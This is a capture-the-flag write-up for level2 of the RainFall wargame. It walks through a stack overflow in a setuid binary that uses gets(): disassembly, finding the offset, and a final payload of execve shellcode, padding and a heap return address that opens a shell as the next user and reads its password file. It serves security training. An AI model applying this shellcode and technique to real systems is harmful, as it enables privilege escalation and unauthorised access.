```sh
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
level2@RainFall:~$ ./level2 
42
42
level2@RainFall:~$ ./level2 42
42
42
```
There is one excutable file **level2**, it works like cat, take standard input, print them and shutting down. \
\
Run the binary file with GDB.
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
...
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
...
```
```p()``` use the ```gets()``` which has vulnerability buffer overflow, but the ```p()``` function checks the **EBP** register address just after function ```gets()```. this mean that function checks ```gets()``` return value came from normal memory area or buffer memory area. \
So we have to jump the compare logic.

```sh
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)                     = 0xbffff6fc
puts("")                                                          = 1
strdup("")                                                        = 0x0804a008
```
We can find ```strdup()``` function always return in the address 0x0804a008, we can put this value in EIP with buffer overflow.
```sh
level2@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a"' > /tmp/exploit1
...
(gdb) r < /tmp/exploit1
Starting program: /home/user/level2/level2 < /tmp/exploit1
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0a6ac72ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a

Program received signal SIGSEGV, Segmentation fault.
0x37636136 in ?? ()
```
```sh
$> python3 level2/Ressources/helper.py
Enter the hex value to find (e.g., 0x63613563): 0x37636136
Little Endian ASCII representation: '6ac7'
'6ac7' found at offset: 80
```
With our helper.py, we can find overflow is at offset 80. \
After that, we save some shell code for execution shell, this is the [ref](https://shell-storm.org/shellcode/files/shellcode-575.html) of the shell code. \
This shell code is 21 bytes, overflow offset is 80. \
Then:
```
21 bytes(shell code) + 59 bytes(something) + 4 bytes(return address)
```
So when ```p()``` function finish, normally it returns to main function, but we did buffer overflow, so now return address is somewhere in the heap(```strdup()```'s return address). And in the heap memory, there is our shell code to execute shell.
```sh
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab" + "\x08\xa0\x04\x08"' > /tmp/exploit1
level2@RainFall:~$ cat /tmp/exploit1 - | ./level2
j
 X�Rh//shh/bin��1�̀aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab35ab6ab7ab8a�
whoami
level3
cat /user/home/level3/.pass
(hidden)
```
level2 passed!
